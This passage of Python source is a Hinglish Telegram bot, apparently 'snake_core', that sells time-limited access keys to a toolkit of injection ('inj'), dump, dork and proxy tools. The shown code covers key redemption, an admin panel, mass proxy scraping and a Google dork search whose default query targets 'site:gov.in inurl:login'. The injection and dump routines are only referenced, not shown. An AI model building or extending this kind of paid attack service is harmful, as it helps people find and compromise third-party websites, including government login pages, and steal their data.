    "kw": tool_kw,
    "rev": tool_rev,
    "inj": tool_inj,
    "parse": tool_parse,
    "proxy": tool_proxy,
    "qa": tool_qa,
    "rand": tool_rand,
    "dump": tool_dump,
}


# ═══════════════════════════════════════════════════════════════════════════════
#  REDEEM KEY
# ═══════════════════════════════════════════════════════════════════════════════
def redeem_key(uid, key: str) -> tuple:
    key = (key or "").strip().upper()
    rec = KEYS.get(key)
    if not rec:
        return False, "❌ Key nahi mili."
    if rec.get("used_by") and str(rec["used_by"]) != str(uid):
        return False, "❌ Ye key pehle use ho chuki hai."
    days = int(rec.get("days") or 0)
    u = USERS.setdefault(str(uid), {})
    base = datetime.now()
    try:
        cur = datetime.fromisoformat(u.get("expires") or "")
        if cur > base:
            base = cur
    except Exception:
        pass
    u["expires"] = (base + timedelta(days=days)).isoformat(timespec="seconds")
    rec["used_by"] = str(uid)
    rec["used_at"] = datetime.now().isoformat(timespec="seconds")
    USERS[str(uid)] = u
    save_all()
    return True, ("✅ Key redeem ho gayi!\n📅 +%d din\n⏳ Valid till <b>%s</b>"
                  % (days, esc(u["expires"][:16].replace("T", " "))))


TOOL_HANDLERS["redeem"] = lambda *a, **k: tool_redeem(*a, **k)


def tool_redeem_text() -> str:
    return (H("REDEEM KEY", "3 tarike") + "\n\n"
            "1️⃣ Neeche key <b>bhej do</b> (button flow)\n"
            "2️⃣ <code>/redeem SNK-AB12-CD34</code>\n"
            "3️⃣ Bas key <b>paste</b> karo — auto redeem\n\n"
            "Format: <code>SNK-XXXX-XXXX</code>\n"
            "Mili nahi? Owner: %s" % ADMIN_USERNAME)


async def tool_redeem(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(tool_redeem_text(), reply_markup=kb_back("m:home"),
                                  parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "key_redeem"


AWAIT_HANDLERS["key_redeem"] = lambda *a, **k: input_redeem(*a, **k)


async def input_redeem(update, context, text: str):
    uid = update.effective_user.id
    key = (text or "").strip().upper()
    if not key:
        await update.effective_message.reply_text(
            "❌ Key khaali hai. Format: <code>SNK-AB12-CD34</code>", parse_mode=ParseMode.HTML)
        return
    ok, msg = redeem_key(uid, key)
    if ok:
        await update.effective_message.reply_text(msg, parse_mode=ParseMode.HTML)
        await show_home(update, uid, edit=False)
        return
    hint = ""
    if not KEY_RE.match(key):
        hint = "\n\n📌 Format: <code>SNK-XXXX-XXXX</code> (dashes ke saath)"
    await update.effective_message.reply_text(
        msg + hint, parse_mode=ParseMode.HTML, reply_markup=kb_needkey())


# ── /redeem command (key ke bina bhi kaam karta hai) ─────────────────────────
async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_verified(context, uid):
        q, kb = captcha_new(context)
        await update.effective_message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return
    arg = (" ".join(getattr(context, "args", []) or [])).strip()
    if arg:
        return await input_redeem(update, context, arg)
    context.user_data["await"] = "key_redeem"
    await update.effective_message.reply_text(tool_redeem_text(),
                                              reply_markup=kb_back("m:home"),
                                              parse_mode=ParseMode.HTML)


# ═══════════════════════════════════════════════════════════════════════════════
#  ADMIN PANEL
# ═══════════════════════════════════════════════════════════════════════════════
def kb_admin() -> InlineKeyboardMarkup:
    return RK([
        [InlineKeyboardButton("📊 DASHBOARD", callback_data="a:dash"),
         InlineKeyboardButton("👥 USERS", callback_data="a:users")],
        [InlineKeyboardButton("🔑 KEYS", callback_data="a:keys"),
         InlineKeyboardButton("🧅 PROXY", callback_data="a:proxy")],
        [InlineKeyboardButton("⚙️ ENGINE", callback_data="a:eng"),
         InlineKeyboardButton("📦 DUMPS", callback_data="a:dumps")],
        [InlineKeyboardButton("🎨 THEME / FONT", callback_data="a:theme"),
         InlineKeyboardButton("🔑 API KEYS", callback_data="a:keys_api")],
        [InlineKeyboardButton("📣 BROADCAST", callback_data="a:bc"),
         InlineKeyboardButton("🚫 BANS", callback_data="a:bans")],
        [InlineKeyboardButton("💾 BACKUP", callback_data="a:backup"),
         InlineKeyboardButton("🖥 SYSTEM", callback_data="a:sys")],
        [InlineKeyboardButton("🧹 CLEAR DUMPS", callback_data="a:cleardumps"),
         InlineKeyboardButton("📜 LOGS", callback_data="a:logs")],
        [InlineKeyboardButton("🔄 RESTART BOT", callback_data="a:restart")],
        [InlineKeyboardButton("⬅️ MAIN MENU", callback_data="m:home")],
    ])


def admin_dash() -> str:
    total = len(USERS)
    active = sum(1 for u in USERS.values() if (u.get("expires") or "") > datetime.now().isoformat())
    banned = sum(1 for u in USERS.values() if u.get("banned"))
    pool = PROXIES or load_proxy_pool()
    c = db_counts()
    try:
        up = int(time.time() - os.path.getmtime(os.path.join(BASE_DIR, "snake_core.py")))
        upt = "%dh %dm" % (up // 3600, (up % 3600) // 60)
    except Exception:
        upt = "—"
    return (H("ADMIN DASHBOARD", "CORE %s" % VERSION) + "\n\n"
            "👥 Users    : <code>%s</code> (active <b>%d</b>, banned <b>%d</b>)\n"
            "🔑 Keys     : <code>%d</code> (unused <b>%d</b>)\n"
            "🧅 Proxies  : <code>%d</code> alive\n"
            "📦 Dumps    : <code>%d</code> files\n"
            "🗄 DB       : <code>%s</code> dorks • <code>%s</code> params\n"
            "⏱ Uptime   : <code>%s</code>"
            % (fmt(total), active, banned, len(KEYS),
               sum(1 for k in KEYS.values() if not k.get("used_by")),
               len(pool), len(dumps_list(999)), fmt(c["dorks"]), fmt(c["parameters"]), upt))


def theme_preview(keys) -> str:
    """Saare themes ka live preview."""
    lines = [H("THEME PICKER", "font + divider + icon"), ""]
    for k in keys:
        th = THEMES[k]
        mark = "✅ " if k == theme_name() else "▫️ "
        lines.append("%s<b>%s</b>" % (mark, F(th["label"], th["head"])))
        lines.append("   %s" % th["div"][:24])
        lines.append("   <code>%s</code>  •  %s"
                     % (F("Buttons", th["btn"]), F("subtitle text", th["sub"])))
        lines.append("")
    lines.append("👇 ek chuno — poora bot usi look me badal jayega")
    return "\n".join(lines)


def kb_themes(cb_prefix: str = "th:set:") -> InlineKeyboardMarkup:
    keys = list(THEMES.keys())
    rows, row = [], []
    for k in keys:
        th = THEMES[k]
        row.append(InlineKeyboardButton(F(th["label"], th["btn"])[:60],
                                        callback_data=cb_prefix + k))
        if len(row) == 2:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    rows.append([InlineKeyboardButton(style("🔄 Reset (classic)", "btn"),
                                      callback_data=cb_prefix + DEFAULT_THEME)])
    return RK(rows)


async def cmd_theme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text(
            "%s\n\nSirf admin theme badal sakta hai.\nAbhi chalu: <b>%s</b>"
            % (H("THEME"), F(THEMES[theme_name()]["label"], T()["head"])),
            parse_mode=ParseMode.HTML)
        return
    await update.effective_message.reply_text(
        theme_preview(list(THEMES.keys())), parse_mode=ParseMode.HTML,
        reply_markup=kb_themes())


async def cb_theme_set(update, context, name: str):
    q = update.callback_query
    if not is_admin(update.effective_user.id):
        try:
            await q.answer("Admin only", show_alert=True)
        except Exception:
            pass
        return
    if name not in THEMES:
        name = DEFAULT_THEME
    sset("theme", name)
    try:
        await q.edit_message_text(
            (H("THEME SET", THEMES[name]["label"]) + "\n\n"
             "✅ Poora bot ab <b>%s</b> look me hai.\n\n"
             "%s\n"
             "⏱ Restart ki zaroorat nahi — turant apply.\n\n"
             "<i>Badalna hai? /theme dobara bhejo.</i>"
             % (F(THEMES[name]["label"], THEMES[name]["head"]), THEMES[name]["div"])),
            parse_mode=ParseMode.HTML, reply_markup=kb_themes())
    except Exception:
        pass


async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Access denied.")
        return
    await update.effective_message.reply_text(admin_dash(), reply_markup=kb_admin(),
                                              parse_mode=ParseMode.HTML)


async def admin_callback(update, context, action: str):
    q = update.callback_query
    uid = update.effective_user.id
    if not is_admin(uid):
        try:
            await q.answer("Admin only", show_alert=True)
        except Exception:
            pass
        return

    async def ed(txt, kb=None):
        try:
            await q.edit_message_text(txt, reply_markup=kb or kb_back("a:home"),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass

    if action == "home":
        return await ed(admin_dash(), kb_admin())
    if action == "dash":
        return await ed(admin_dash(), kb_admin())

    if action == "users":
        rows = [[InlineKeyboardButton("⬇️ CSV EXPORT", callback_data="a:userscsv")]]
        rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="a:home")])
        lst = sorted(USERS.items(), key=lambda z: z[1].get("last") or "", reverse=True)[:20]
        body = "\n".join("• <code>%s</code> %s %s" % (
            u, esc((r.get("name") or "?")[:18]),
            "🚫" if r.get("banned") else ("✅" if (r.get("expires") or "") > datetime.now().isoformat() else "⚪"))
            for u, r in lst) or "—"
        return await ed(H("ADMIN — USERS", "%d total" % len(USERS)) + "\n\n" + body,
                       RK(rows))

    if action == "userscsv":
        path = dump_json(USERS, "users")
        await send_file(update, path, "👥 users.json")
        return

    if action == "keys":
        unused = sum(1 for k in KEYS.values() if not k.get("used_by"))
        kb = RK([
            [InlineKeyboardButton("➕ 7 DIN", callback_data="a:genkey:7"),
             InlineKeyboardButton("➕ 30 DIN", callback_data="a:genkey:30")],
            [InlineKeyboardButton("➕ 90 DIN", callback_data="a:genkey:90"),
             InlineKeyboardButton("♾ 365 DIN", callback_data="a:genkey:365")],
            [InlineKeyboardButton("📋 LIST", callback_data="a:keylist")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:home")],
        ])
        return await ed(H("ADMIN — KEYS", "%d total • %d unused" % (len(KEYS), unused)) +
                        "\n\nNaya key kis duration ka?", kb)

    if action.startswith("genkey:"):
        days = int(action.split(":")[1])
        key = "SNK-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)) + "-" + \
              "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
        KEYS[key] = {"days": days, "created": datetime.now().isoformat(timespec="seconds")}
        save_all()
        kb = RK([
            [InlineKeyboardButton("➕ AUR 7D", callback_data="a:genkey:7")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:keys")],
        ])
        return await ed(H("KEY BAN GAYI") + "\n\n<code>%s</code>\n\n📅 %d din\n\n"
                        "<i>Copy karke user ko bhejo.</i>" % (key, days), kb)

    if action == "keylist":
        items = list(KEYS.items())[-25:]
        body = "\n".join("• <code>%s</code> %dd %s" % (k, v.get("days", 0),
                                                       ("✅ " + str(v.get("used_by"))) if v.get("used_by") else "⚪ unused")
                         for k, v in items) or "—"
        return await ed(H("KEYS", "%d total" % len(KEYS)) + "\n\n" + body)

    if action == "proxy":
        pool = PROXIES or load_proxy_pool()
        kb = RK([
            [InlineKeyboardButton("🚀 SCAN NOW", callback_data="a:pxscan")],
            [InlineKeyboardButton("🗑 CLEAR", callback_data="a:pxclear")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:home")],
        ])
        return await ed(H("ADMIN — PROXY") + "\n\n✅ Alive: <code>%d</code>\n📄 Manual: <code>%d</code>\n"
                        "🌐 Sources: <code>%d</code>\n\n%s"
                        % (len(pool), len(manual_proxies()), len(PROXY_SOURCES),
                           short_list([p["url"].replace("http://", "") for p in pool[:12]], 12)), kb)

    if action == "pxscan":
        await ed("⏳ Admin scan chal raha hai…")
        px = _uniq(await scrape_proxies(force=True) + manual_proxies())
        good = await check_proxies(px[:4000], concurrency=400, want=200)
        save_proxy_pool(good)
        return await ed(H("ADMIN — PROXY") + "\n\nScraped: <code>%s</code>\nAlive: <code>%d</code>\n"
                        "Sources: <code>%d/%d</code>"
                        % (fmt(len(px)), len(good), PSTATS.get("sources_ok", 0), len(PROXY_SOURCES)),
                        RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))

    if action == "pxclear":
        save_proxy_pool([])
        return await ed("🗑 Pool clear.", RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))

    if action == "eng":
        kb = RK([
            [InlineKeyboardButton("Pages: %s" % sget("parse_pages", 1), callback_data="a:setpages")],
            [InlineKeyboardButton("Check timeout: %ss" % sget("check_timeout", 6), callback_data="a:setto")],
            [InlineKeyboardButton("Concurrency: %s" % sget("concurrency", 400), callback_data="a:setconc")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:home")],
        ])
        return await ed(H("ADMIN — ENGINE") + "\n\nIn settings ko badalne ke liye button dabao "
                        "(value cycle hoti hai).", kb)

    if action == "setpages":
        v = int(sget("parse_pages", 1))
        v = 1 if v >= 5 else v + 1
        sset("parse_pages", v)
        return await admin_callback(update, context, "eng")
    if action == "setto":
        v = int(sget("check_timeout", 6))
        v = 4 if v >= 12 else v + 2
        sset("check_timeout", v)
        return await admin_callback(update, context, "eng")
    if action == "setconc":
        v = int(sget("concurrency", 400))
        v = 100 if v >= 800 else v + 100
        sset("concurrency", v)
        return await admin_callback(update, context, "eng")

    if action == "dumps":
        files = dumps_list(10)
        body = "\n".join("• <code>%s</code> %.0f KB" % (os.path.basename(f)[:40],
                                                        os.path.getsize(f) / 1024) for f in files) or "—"
        return await ed(H("ADMIN — DUMPS", "%d files" % len(files)) + "\n\n" + body)

    if action == "cleardumps":
        n = 0
        for f in dumps_list(9999):
            try:
                os.remove(f)
                n += 1
            except Exception:
                pass
        return await ed("🧹 %d files delete." % n, RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:home")]]))

    if action == "bc":
        context.user_data["await"] = "bc_text"
        context.user_data["await_admin"] = True
        return await ed(H("ADMIN — BROADCAST") + "\n\nAb message bhejo — sab users ko jayega.\n"
                        "<i>Cancel: /admin</i>",
                        RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:home")]]))
    if action == "bans":
        lst = [(u, r) for u, r in USERS.items() if r.get("banned")]
        body = "\n".join("• <code>%s</code> %s" % (u, esc((r.get("name") or "?")[:18])) for u, r in lst) or "—"
        return await ed(H("ADMIN — BANS", "%d banned" % len(lst)) + "\n\n" + body +
                        "\n\n<i>Ban/unban: /ban &lt;id&gt; , /unban &lt;id&gt;</i>")
    if action == "backup":
        name = os.path.join(DUMP_DIR, "backup_%s.zip" % stamp())
        with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in ("users.json", "keys.json", "settings.json", "proxies.json"):
                p = _path(f)
                if os.path.exists(p):
                    zf.write(p, arcname=f)
        await send_file(update, name, "💾 backup")
        return
    if action == "keys_api":
        k = api_keys()
        await ed(H("API KEYS", "optional free tiers") + "\n\n"
                 "SerpAPI : %s   <code>/setkey serpapi KEY</code>\n"
                 "CSE     : %s   <code>/setkey cse KEY CX</code>\n"
                 "CC      : ✅ always on (free)\n\n"
                 "<i>Bina keys ke bhi 13 engines + Common Crawl chalte hain.</i>"
                 % ("✅" if k["serpapi"] else "⚪", "✅" if (k["cse_key"] and k["cse_cx"]) else "⚪"))
        return

    if action == "theme":
        try:
            await q.edit_message_text(theme_preview(list(THEMES.keys())),
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_themes("a:themeset:"))
        except Exception:
            pass
        return

    if action.startswith("themeset:"):
        name = action.split(":", 1)[1]
        if name not in THEMES:
            name = DEFAULT_THEME
        sset("theme", name)
        try:
            await q.edit_message_text(
                (H("THEME SET", THEMES[name]["label"]) + "\n\n"
                 "✅ Poora bot ab <b>%s</b> look me hai.\n\n%s"
                 % (F(THEMES[name]["label"], THEMES[name]["head"]), THEMES[name]["div"])),
                parse_mode=ParseMode.HTML, reply_markup=kb_themes("a:themeset:"))
        except Exception:
            pass
        return

    if action == "logs":
        p = os.path.join(BASE_DIR, "bot.log")
        tail = "—"
        if os.path.exists(p):
            try:
                with open(p, encoding="utf-8", errors="ignore") as f:
                    tail = "".join(f.readlines()[-25:])
            except Exception:
                tail = "—"
        for ch in chunk_lines(H("ADMIN — LOGS") + "\n\n<pre>%s</pre>" % esc(tail[-3500:]))[:2]:
            try:
                await q.message.reply_text(ch, parse_mode=ParseMode.HTML)
            except Exception:
                pass
        return

    if action == "restart":
        try:
            await q.edit_message_text("🔄 Restarting…", parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await asyncio.sleep(0.5)
        os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)] + sys.argv[1:])
        return

    if action == "sys":
        try:
            import platform
            txt = (H("ADMIN — SYSTEM") + "\n\n"
                   "🐍 %s %s\n🖥 %s\n🐍 Python %s\n"
                   "📁 %s\n🧵 PID %d\n📊 Lines %d"
                   % (BRAND, VERSION, esc(platform.platform()[:48]),
                      esc(platform.python_version()), esc(BASE_DIR), os.getpid(),
                      len(open(os.path.abspath(__file__), encoding="utf-8").readlines())))
        except Exception as exc:
            txt = "❌ %s" % exc
        return await ed(txt)

    await ed("❓ Unknown action", kb_admin())


# ── admin text commands ──────────────────────────────────────────────────────
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: /ban <user_id>")
        return
    t = context.args[0]
    USERS.setdefault(t, {})["banned"] = True
    save_all()
    await update.effective_message.reply_text("🚫 Banned <code>%s</code>" % t, parse_mode=ParseMode.HTML)


async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: /unban <user_id>")
        return
    t = context.args[0]
    if t in USERS:
        USERS[t].pop("banned", None)
        save_all()
    await update.effective_message.reply_text("✅ Unbanned <code>%s</code>" % t, parse_mode=ParseMode.HTML)


async def cmd_addkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    days = 30
    if context.args:
        try:
            days = int(context.args[0])
        except Exception:
            pass
    key = "SNK-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)) + "-" + \
          "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
    KEYS[key] = {"days": days, "created": datetime.now().isoformat(timespec="seconds")}
    save_all()
    await update.effective_message.reply_text(
        "🔑 <code>%s</code>\n📅 %d din" % (key, days), parse_mode=ParseMode.HTML)


AWAIT_HANDLERS["bc_text"] = lambda *a, **k: input_broadcast(*a, **k)
AWAIT_HANDLERS["deep_max"] = lambda *a, **k: input_deep_max(*a, **k)


async def input_broadcast(update, context, text: str):
    if not is_admin(update.effective_user.id):
        return
    msg = await update.effective_message.reply_text("📣 Bheja ja raha hai…")
    sent, fail = 0, 0
    for uid in list(USERS.keys()):
        try:
            await context.bot.send_message(chat_id=int(uid), text=text)
            sent += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    try:
        await msg.edit_text("📣 <b>Broadcast done</b>\n\n✅ Sent: <code>%d</code>\n"
                            "❌ Fail: <code>%d</code>" % (sent, fail), parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
async def on_error(update, context):
    logger.error("handler error: %s", context.error, exc_info=context.error)


async def _post_init(app) -> None:
    """Telegram ke "/" menu me commands dikhein (redeem included)."""
    try:
        await app.bot.set_my_commands([
            BotCommand("start", "🏠 Menu"),
            BotCommand("redeem", "🔑 Key redeem karo"),
            BotCommand("help", "📖 Help"),
            BotCommand("theme", "🎨 Theme badlo"),
            BotCommand("myid", "🪪 Apni ID"),
            BotCommand("ping", "🏓 Bot zinda?"),
            BotCommand("gtest", "🐦 Free Google test"),
            BotCommand("fresh", "🆕 Fresh dork history"),
            BotCommand("admin", "👑 Admin panel"),
        ])
        logger.info("✅ Bot commands set (/redeem included)")
    except Exception as exc:
        logger.warning("set_my_commands skip: %s", exc)


def build_app() -> Application:
    app = (ApplicationBuilder().token(TOKEN).concurrent_updates(True)
           .post_init(_post_init).build())
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("myid", cmd_myid))
    app.add_handler(CommandHandler("ping", cmd_ping))
    app.add_handler(CommandHandler("setkey", cmd_setkey))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("theme", cmd_theme))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("addkey", cmd_addkey))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("gtest", cmd_gtest))
    app.add_handler(CommandHandler("fresh", cmd_fresh))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)
    return app


def _install_signals(stop_event) -> None:
    """SIGINT / SIGTERM pe clean shutdown."""
    def _stop(*_a):
        try:
            stop_event.set()
        except Exception:
            pass
    for name in ("SIGINT", "SIGTERM", "SIGHUP"):
        sig = getattr(signal, name, None)
        if sig is None:
            continue
        try:
            asyncio.get_running_loop().add_signal_handler(sig, _stop)
        except (NotImplementedError, RuntimeError, ValueError):
            try:
                signal.signal(sig, _stop)
            except Exception:
                pass


selfcheck = {}     # startup diagnostics (/ping me dikhta hai)


async def _self_check(app) -> None:
    """Startup pe Telegram side verify — webhook / conflict / token."""
    try:
        me = await app.bot.get_me()
        logger.info("🤖 Bot: @%s (id %s) — token OK", me.username, me.id)
        selfcheck["username"] = me.username
    except Exception as exc:
        logger.error("❌ getMe FAIL — token galat/revoke: %s", exc)
        print("\n" + "=" * 62)
        print("  ❌ TOKEN GALAT YA REVOKE HO CHUKA")
        print("=" * 62)
        print("  BotFather → /revoke → naya token → ./setconfig.sh --token <naya>")
        print("=" * 62 + "\n")
        return

    # webhook set hai? -> polling chalti hi nahi. Hata do.
    try:
        wh = await app.bot.get_webhook_info()
        if wh.url:
            logger.warning("⚠️ Webhook set tha (%s) — polling block ho rahi thi. Hata rahe hain…", wh.url)
            selfcheck["webhook_removed"] = wh.url
            await app.bot.delete_webhook(drop_pending_updates=False)
            logger.info("✅ Webhook hata diya — ab polling chalegi")
        else:
            logger.info("✅ Webhook clear hai (polling mode)")
    except Exception as exc:
        logger.warning("webhook check skip: %s", exc)

    # conflict check — koi dusra bot same token pe?

    selfcheck["ok"] = True
    # admin ko online message
    try:
        for aid in ADMIN_IDS:
            await app.bot.send_message(
                chat_id=int(aid),
                text=("🐍 <b>%s ONLINE</b>\n%s\n🤖 @%s\n🧵 PID %d\n%s\n\n"
                      "<i>/ping se kabhi bhi check kar sakte ho</i>"
                      % (BRAND, T()["div"], me.username, os.getpid(), T()["div"])),
                parse_mode=ParseMode.HTML)
    except Exception as exc:
        logger.warning("admin online msg fail: %s", exc)


async def cmd_setkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: optional API keys (Google CSE / SerpAPI). Free tiers."""
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Admin only.")
        return
    k = api_keys()
    args = list(context.args or [])
    if not args:
        txt = (H("API KEYS", "optional — free tiers") + "\n\n"
               "Ye dono <b>optional</b> hain. Bina inke bot chalta hai "
               "(13 engines + Common Crawl + Wayback free).\n\n"
               "🔑 <b>SerpAPI</b> — 100 searches/mahina FREE\n"
               "   <i>asli Google results + poore dorks (inurl:/filetype:)</i>\n"
               "   serpapi.com → signup → API key\n"
               "   <code>/setkey serpapi YOUR_KEY</code>\n\n"
               "🔑 <b>Google CSE</b> — 100 queries/din FREE\n"
               "   <i>par inurl: support nahi karta (kam useful)</i>\n"
               "   <code>/setkey cse API_KEY CX_ID</code>\n\n"
               "🐦 <b>Google Free (ijerm)</b> — koi key nahi, FREE\n"
               "   <i>asli Google results, dork support (site:/inurl:)</i>\n"
               "   default ON hai. Band: <code>/setkey gjerm -</code>\n"
               "   URL badalna: <code>/setkey gjerm https://...</code>\n\n"
               "🗑 Hatane ke liye: <code>/setkey serpapi -</code>\n\n"
               "━━ Status ━━\n"
               "SerpAPI : %s\n"
               "CSE     : %s\n"
               "CC      : ✅ always on (free, no key)\n"
               "Google  : %s"
               % ("✅ set" if k["serpapi"] else "⚪ not set",
                  "✅ set" if (k["cse_key"] and k["cse_cx"]) else "⚪ not set",
                  ("⚪ OFF" if not gj_enabled() else
                   ("✅ ON • %d ok / %d fail" % (GJ_STATE["ok"], GJ_STATE["fail"])))))
        await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML)
        return
    what = args[0].lower()
    if what in ("gjerm", "gj", "gfree", "google"):
        val = (args[1].strip() if len(args) > 1 else "")
        if not val:
            await update.effective_message.reply_text(
                "Usage:\n<code>/setkey gjerm -</code>  (band karo)\n"
                "<code>/setkey gjerm https://...</code>  (URL badlo)", parse_mode=ParseMode.HTML)
            return
        if val == "-":
            sset("gj_url", "-")
            await update.effective_message.reply_text("⚪ Free Google band kar diya.")
            return
        if not val.startswith("http"):
            await update.effective_message.reply_text("❌ URL <code>http...</code> se shuru hona chahiye.",
                                                      parse_mode=ParseMode.HTML)
            return
        sset("gj_url", val)
        GJ_STATE.update({"fail": 0, "dead_until": 0.0})
        await update.effective_message.reply_text(
            "✅ Free Google URL set:\n<code>%s</code>" % esc(val[:120]), parse_mode=ParseMode.HTML)
        return
    if what == "serpapi":
        if len(args) < 2:
            await update.effective_message.reply_text("Usage: /setkey serpapi YOUR_KEY")
            return
        val = args[1].strip()
        sset("serpapi", "" if val == "-" else val)
        await update.effective_message.reply_text(
            "✅ SerpAPI %s" % ("hata diya" if val == "-" else "set ho gaya (100/month free)"))
        return
    if what == "cse":
        if len(args) < 3:
            await update.effective_message.reply_text("Usage: /setkey cse API_KEY CX_ID")
            return
        sset("cse_key", "" if args[1] == "-" else args[1].strip())
        sset("cse_cx", "" if args[1] == "-" else args[2].strip())
        await update.effective_message.reply_text("✅ Google CSE set ho gaya (100/day free)")
        return
    await update.effective_message.reply_text(
        "❓ Options: <code>serpapi</code> ya <code>cse</code>", parse_mode=ParseMode.HTML)


async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kya bot zinda hai? + theme + uptime + free Google status."""
    t0 = time.time()
    msg = await update.effective_message.reply_text("🏓 …")
    ms = int((time.time() - t0) * 1000)
    up = int(time.time() - START_TS)
    if not gj_enabled():
        gj = "⚪ OFF"
    elif not gj_alive():
        gj = "⏸ 5 min cooldown"
    else:
        gj = "✅ ON (%d ok / %d fail)" % (GJ_STATE["ok"], GJ_STATE["fail"])
    txt = (H("PONG", "%s ms" % ms) + "\n\n"
           "🟢 Bot zinda hai\n"
           "🤖 @%s\n"
           "🎨 Theme: <b>%s</b>\n"
           "⏱ Uptime: <code>%dh %dm</code>\n"
           "🧵 PID: <code>%d</code>\n"
           "👥 Users: <code>%d</code>\n"
           "🐦 Free Google: %s")
    txt = txt % (selfcheck.get("username") or "?",
                 F(THEMES[theme_name()]["label"], T()["head"]),
                 up // 3600, (up % 3600) // 60, os.getpid(), len(USERS), gj)
    await msg.edit_text(txt, parse_mode=ParseMode.HTML)


async def cmd_fresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /freshclear — fresh history saaf | /fresh — stats """
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Admin only.")
        return
    arg = (context.args or [""])[0].lower() if context.args else ""
    if arg in ("clear", "reset", "clean"):
        n = dork_seen_clear()
        await update.effective_message.reply_text(
            "🧹 Fresh history clear — <code>%s</code> dorks hata diye.\n"
            "Ab sab dorks dobara 'naye' maane jayenge." % fmt(n),
            parse_mode=ParseMode.HTML)
        return
    await update.effective_message.reply_text(
        (H("FRESH SYSTEM", "duplicate dork nahi") + "\n\n"
         "📚 History : <code>%s</code> dorks\n"
         "🆕 Naya batch banate waqt purane skip hote hain\n"
         "🎯 Isse har baar <b>fresh URLs</b> milte hain\n\n"
         "🧹 Clear karne ke liye: <code>/fresh clear</code>"
         % fmt(dork_seen_count())),
        parse_mode=ParseMode.HTML)


async def cmd_gtest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/gtest <dork> — free Google endpoint live test (proof)."""
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Admin only.")
        return
    dork = " ".join(context.args or []).strip()
    if not dork:
        dork = "site:gov.in inurl:login"
    if not gj_enabled():
        await update.effective_message.reply_text(
            "⚪ Free Google band hai. Chalu karo:\n<code>/setkey gjerm https://...</code>",
            parse_mode=ParseMode.HTML)
        return
    msg = await update.effective_message.reply_text(
        "🐦 Testing free Google…\n<code>%s</code>" % esc(dork[:100]), parse_mode=ParseMode.HTML)
    t0 = time.time()
    conn = aiohttp.TCPConnector(limit=4, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        urls = await gjerm_search(session, dork, pages=2)
    took = time.time() - t0
    if not urls:
        await msg.edit_text(
            (H("FREE GOOGLE — FAIL", "%.1fs" % took) + "\n\n"
             "❌ 0 URLs mile.\n"
             "• Endpoint band ho sakta hai\n"
             "• Ya rate-limit lag gaya\n\n"
             "🔁 Thodi der baad try karo, ya naya URL:\n"
             "<code>/setkey gjerm https://...</code>"),
            parse_mode=ParseMode.HTML)
        return
    body = "\n".join("%d. <code>%s</code>" % (i, esc(u[:95])) for i, u in enumerate(urls[:12], 1))
    await msg.edit_text(
        (H("FREE GOOGLE — WORKING ✅", "%.1fs • %d URLs" % (took, len(urls))) + "\n\n"
         "🎯 Dork: <code>%s</code>\n"
         "📊 Pages: 2\n"
         "⚡ Speed: <code>%.1fs</code>\n"
         "🔑 Key: <b>nahi chahiye</b>\n\n"
